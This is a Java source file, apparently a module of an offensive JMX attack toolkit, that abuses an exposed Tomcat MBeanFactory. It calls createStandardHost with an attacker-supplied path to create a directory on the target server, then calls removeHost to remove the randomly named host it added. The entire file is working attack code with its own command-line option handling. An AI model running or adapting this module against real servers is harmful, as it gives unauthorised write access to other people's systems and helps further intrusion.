package jmxattacks;

import java.math.BigInteger;
import java.security.SecureRandom;

import javax.management.ObjectName;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

import jmxmenus.MainMenu;
import jmxutils.EasyBasicParser;

public class MakeDir extends Attack{
	
	String description = "This attack will create a directory on the server";
	String name = "MakeDir\t";
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--path /tmp/newdirectory/ (or C:/directory or \\)";
	private static String mbean = "Catalina:type=MBeanFactory";
	private static String operation ="createStandardHost";
	private static String operation2 ="removeHost";
	private ObjectName object ;
	private String path;
	private String host;
	
	public MakeDir()
	{
		this.setAttack_description(description);
		this.setAttack_name(name);	
	}
	
	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		   options.addOption(OptionBuilder
			       .withArgName("path")
			       .withLongOpt("path")
			       .hasArg()
			       .isRequired()
			       .withDescription("fullpath to directory to create")
			       .create());
		   
		   return options;
	}
	
	private void exploit()
	{
		// Prepare createStandardHost invocation
		
		Object retour;	
        Object[] a = new Object[7];      
        String[] b = new String[7];     
        System.out.println("#### " +this.operation+ " operation will be invoke ####");
        // Invoke createStandardHost
         
        CreateHost att= null;
		att = new CreateHost();
		att.prepareExploit("--path "+this.path +" --name " + this.host);
	
		try {
			Thread.sleep(2000);
		} catch (InterruptedException e) {
			System.out.println(e.getMessage());	
		}
		// Prepare removeHost
		a = new Object[1];
        a[0] = "Catalina:type=Host,host="+this.host;
        b = new String[1];
        b[0] = "java.lang.String";
        System.out.println("#### " +this.operation2+ " operation will be invoke ####");
        // Invoke removeHost
        retour = invoke(this.object, this.operation2,a, b);
		if (retour != null) System.out.println(retour.toString());
		try {
			Thread.sleep(2000);
		} catch (InterruptedException e) {
			System.out.println(e.getMessage());	
		}
	}
	
	public void prepareExploit() {
		System.out.println("MakeDir exploit selected");
		this.object = createObject(this.mbean);
		SecureRandom random = new SecureRandom();
		this.host = new BigInteger(130, random).toString(32);
		
		if (this.object != null)
		{ 
			// Display Menu to retrieve options
			
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			
			if (line != null)
			{
			    this.path = line.getOptionValue("path");
			   
			    this.exploit();
			}
							
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
			MainMenu menu = new MainMenu();
			
	}
	
	public void prepareExploit(String arg)
	{
		

		this.object = createObject(this.mbean);
		SecureRandom random = new SecureRandom();
		this.host = new BigInteger(130, random).toString(32);
		
		if (this.object != null)
		{ 
			Parser parser = new EasyBasicParser();
			CommandLine line = null;
			try {
				line = parser.parse( this.setArgs(), StringtoArrayList(arg));
			}  catch( ParseException exp ) 
		    {
		        System.err.println( "Parsing failed.  Reason: " + exp.getMessage() );
			    System.exit(-1);	
			}		
			if (line != null)
			{
			    this.path = line.getOptionValue("path");
			    this.exploit();
			}
							
		}
		
	}
}
